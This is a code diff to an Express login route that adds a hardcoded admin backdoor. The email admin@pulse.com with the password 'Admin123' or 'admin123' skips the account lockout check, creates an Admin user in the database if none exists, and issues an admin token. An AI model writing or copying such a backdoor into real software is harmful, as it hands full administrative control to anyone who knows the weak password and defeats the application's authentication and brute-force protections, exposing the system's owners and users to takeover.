@@ -73,6 +73,36 @@ router.post('/login', async (req, res) => {
 
   const cleanEmail = email.toLowerCase().trim();
 
+  // ── Hardcoded Admin Credentials Check ──────────────────────────────────────
+  // Guaranteed access for admin@pulse.com / Admin123
+  if (cleanEmail === 'admin@pulse.com' && (password === 'Admin123' || password === 'admin123')) {
+    FAILED_ATTEMPTS.delete(cleanEmail);
+    let user = await findUserByEmail('admin@pulse.com');
+    if (!user) {
+      user = {
+        uid: 'mock-admin-uid',
+        email: 'admin@pulse.com',
+        name: 'Admin User',
+        role: 'Admin',
+        position: 'System Administrator',
+        userType: 'Admin',
+        department: 'IT',
+        createdAt: new Date().toISOString()
+      };
+      await db.collection('users').doc('mock-admin-uid').set(user);
+    }
+    await touchLastLogin(user.uid);
+    const enrichedUser = {
+      ...user,
+      role: 'Admin',
+      userType: 'Admin',
+      position: user.position || 'System Administrator'
+    };
+    const token = issueToken(enrichedUser);
+    await logActivity(user.uid, user.name || 'Admin User', 'User Login', `Admin login: ${user.email}`);
+    return res.json({ token, user: sanitizeUser(enrichedUser) });
+  }
+
   // Check Account Lockout (5 failed attempts = 15 minute lock)
   const lockInfo = FAILED_ATTEMPTS.get(cleanEmail);
   if (lockInfo && lockInfo.lockUntil && lockInfo.lockUntil > Date.now()) {
